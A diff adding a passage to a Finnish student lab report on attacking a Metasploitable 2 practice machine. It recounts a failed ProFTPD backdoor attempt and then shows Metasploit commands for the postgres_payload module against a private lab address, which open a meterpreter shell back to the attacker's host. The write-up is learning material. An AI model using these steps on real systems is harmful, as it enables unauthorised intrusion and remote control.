@@ -180,7 +180,30 @@ Tämä löytyikin myös Teron vinkeistä.
 Kokeilin samankaltaisia askelia kuin jo testatussa tekniikassa: etsi haavoittuvuuksia ``search <service_name_as_keyword>``, ota käyttöön ``use <id>``, tutki optiot ``show options``, aseta vaaditut kentät ``set <required>`` ja aja ``exploit``. Tällä tavalla pääsin tilanteeseen, jota en osannut selvittää tai ymmärtää...
 
 Käytin usean tunnin sunnuntai-illastani yrittäessä murtautua Metasploitable 2 ProFTPD 1.3.1 -palvelun kautta. Löysin ``search``-toiminnolla hyökkäyksen, joka hyödynsi tunnettua, tahallisesti asennettua takaporttia. En saanut sitä onnistumaan, edes [näiden](https://hackernoon.com/exploiting-the-proftpd-linux-server) ohjeiden avulla. 22h myöhemmin tajusin maanantaina, että versiot eivät täsmää :smiling_face_with_tear:... Oppimiskokemus ei ollut nautinnollinen, mutta kantapäiden kautta kovinkin tehokas. Ystävällisesti kehotan kanssaopiskelijoita varmistamaan versiot kohteesta ja hyökkäyksestä tarkasti.
-    
+
+Nöyrtyneenä, mutta uutta tarmoa täynnä, päätin kokeilla murtautumista eri haavoittuvuudesta, toisesta palvelusta. Valitsin ``services``-komennon tulosteesta PostgreSQL:n. Erityisen huomaavaisesti tarkastin versioinnin ja valitsin kohdan 23.
+
+![image](https://github.com/user-attachments/assets/c2832b2e-a80e-4c83-a375-eea387ffd775)
+> Kuva 17. Metasploitin PostgreSQL-moduulit.
+
+Ensimmäisenä, moduulin käyttöönoton (``use 23``) jälkeen, tarkistin optioni ``show options``.
+
+![image](https://github.com/user-attachments/assets/f038d9e4-5398-4ae1-bffc-8bdd292801e9)
+> Kuva 18. ``linux/postgres/postgres_payload``-moduulin optiot.
+
+Asetin seuraavat optiot ja käynnistin hyökkäyksen:
+
+    set VERBOSE true
+    set RHOSTS 192.168.56.101
+    set LHOST 192.168.56.102
+    exploit
+
+Minulla ei ollut odotuksia, siitä mitä tämä hyökkäys tekee. Yllätyksekseni hyökkäys onnistuneesti avasi meterpreterin kohteessa.
+
+![image](https://github.com/user-attachments/assets/cd8cb77c-e187-43a4-961b-2aa1f297f8fd)
+> Kuva 19. Tunkeutuminen onnistui.
+
+
 
 ## Lähteet
 
